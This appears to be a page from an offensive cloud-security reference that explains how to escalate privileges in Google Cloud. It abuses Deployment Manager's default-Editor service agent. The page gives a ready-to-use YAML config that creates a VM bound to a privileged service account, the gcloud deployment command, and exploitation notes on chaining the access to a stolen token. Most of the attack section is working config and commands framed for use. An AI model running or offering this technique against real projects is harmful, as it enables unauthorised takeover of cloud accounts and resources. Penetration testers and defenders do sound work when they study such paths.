---
title: "Deployment Manager: deploy as the default-Editor service agent"
description: "Creating a Deployment Manager deployment with deploymentmanager.deployments.create, which runs as the Google APIs service agent that holds Editor by default."
keywords:
  - Deployment Manager
  - deployments.create
  - Google APIs service agent
  - Editor
  - actAs
  - deploy
---

# Deployment Manager

Deployment Manager deployments run as the **Google APIs service agent** (`<project-number>@cloudservices.gserviceaccount.com`), which holds the `roles/editor` on the project by default. With `deploymentmanager.deployments.create`, you deploy a configuration that creates a resource granting you access, effectively borrowing Editor without holding `actAs` on a normal service account.

## Deploy a config that escalates

```yaml
# escalate.yaml: have the Editor service agent grant you a role, or create a
# VM/function bound to a privileged account
resources:
  - name: pwn-vm
    type: compute.v1.instance
    properties:
      zone: <zone>
      machineType: zones/<zone>/machineTypes/e2-small
      serviceAccounts:
        - email: <privileged-sa>@<project>.iam.gserviceaccount.com
          scopes: [ "https://www.googleapis.com/auth/cloud-platform" ]
      # ... disks / network ...
```

```bash
gcloud deployment-manager deployments create pwn --config=escalate.yaml
```

## Exploitation notes

- The service agent's default Editor is the point: the deployment creates resources you could not create directly, running as Editor.
- Editor cannot set IAM policy, so chain to a resource that yields a token (a VM or function bound to a privileged account) rather than expecting a direct Owner grant.
- Deployment Manager is being wound down in favour of Infrastructure Manager; the technique persists wherever the API is still enabled.

## Tools

- **gcloud** (`deployment-manager deployments create`): the deploy.
- **GCP-IAM-Privilege-Escalation** (Rhino): documents the service-agent Editor path.

## References

- [Rhino Security Labs: GCP privilege escalation (part 2)](https://rhinosecuritylabs.com/gcp/privilege-escalation-google-cloud-platform-part-2/)
- [GCP IAM privilege escalation (Rhino repo)](https://github.com/RhinoSecurityLabs/GCP-IAM-Privilege-Escalation)
- [Google: Deployment Manager access control](https://cloud.google.com/deployment-manager/docs/access-control)
